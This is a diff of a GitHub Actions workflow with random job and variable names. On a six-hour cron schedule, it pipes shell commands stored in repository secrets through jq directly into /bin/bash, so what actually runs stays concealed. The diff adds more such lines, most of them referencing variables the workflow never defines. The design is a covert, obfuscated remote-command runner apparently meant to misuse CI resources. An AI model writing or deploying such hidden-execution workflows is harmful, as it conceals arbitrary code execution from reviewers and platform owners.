@@ -2,7 +2,8 @@ name: fnjcjkkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
+    - cron: '34 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: fnjcjkkk
         env:
-          dgxrv53: ${{ secrets.dgxrv53 }}
+          z9685: ${{ secrets.z9685 }}
         run: |
-          echo $dgxrv53 | jq -r .yyt61560 | /bin/bash
-          echo $zydiq645 | jq -r .cnsl472 | /bin/bash
-          echo $shbvg5 | jq -r .z065 | /bin/bash
-          echo $v0 | jq -r .d4545 | /bin/bash
-          echo $rfsqt62 | jq -r .esw4 | /bin/bash
+          echo $z9685 | jq -r .e8973 | /bin/bash
+          echo $rarr14546 | jq -r .c6 | /bin/bash
+          echo $bio1113 | jq -r .mum8873 | /bin/bash
+          echo $zlx5323 | jq -r .t9197 | /bin/bash
+          echo $bcqd1405 | jq -r .r9 | /bin/bash
+          echo $yfb310 | jq -r .uhmq743 | /bin/bash
+          echo $h86 | jq -r .di09 | /bin/bash
+          echo $pkbgr387 | jq -r .lzdsa4713 | /bin/bash
+          echo $zdvld3 | jq -r .jw4026 | /bin/bash
+          echo $vmoc001 | jq -r .k2463 | /bin/bash
+          echo $cn90319 | jq -r .gfdrh57 | /bin/bash
 
